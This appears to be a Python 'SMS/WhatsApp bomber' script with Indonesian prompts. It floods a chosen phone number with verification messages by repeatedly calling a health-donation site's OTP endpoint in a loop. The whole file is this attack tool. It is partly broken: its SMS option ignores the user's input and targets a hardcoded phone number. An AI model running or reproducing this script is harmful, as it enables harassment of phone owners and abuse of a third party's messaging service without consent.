import requests as r
import os

a ='\033[92m'
b ='\033[91m'
c ='\033[0m'

os.system('clear')

banner = a+"""
                        _________
                        [       ]
                        | 0   0 |
                      //|   °   |\\
                     $  [__###__]  $
                        | |   | |
                        ---   ---
                       ({Bomber})
                  -github.com/rezzaapr-
"""

def wa():
    os.system('clear')
    print (banner)
    num = input(c+'Masukan Nomor Tanpa 62/0 : ')
    jum = int(input('Jumlah :'))
    for i in range(jum):
        req = r.get('https://passport.pedulisehat.id/v2/sms/captcha?mobile='+num+'&mobile_country_code=62&channel=Sms&_=1591007074597')
        if req.status_code == 200:
           print(a+'Succes Sent To :' +num)
        else:
           print(b+'Gagal Mengirim')

def sms():
    os.system('clear')
    print (banner)
    num = input('+cMasukan Nomor Tanpa 62/0 : ')
    jum = int(input('Jumlah :'))
    for i in range(jum):
        req = r.get('https://passport.pedulisehat.id/v2/sms/captcha?mobile=85885105039&mobile_country_code=62&channel=Sms&_=1591007074597')
        if req.status_code == 200:
           print(a+'Succes Sent To :' +num)
        else:
           print(b+'Gagal Mengirim')

while True:
      print(banner)
      print(b+'[1] Whatsapp')
      print('[2] SMS')
      print('[3] Exit\n')
      p = input("Pilihan : ")
      if p == '1':
         wa()
      elif p == '2':
         sms()
      elif p == '3':
         exit()
else:
   print("Masukan Command Yang Benar")

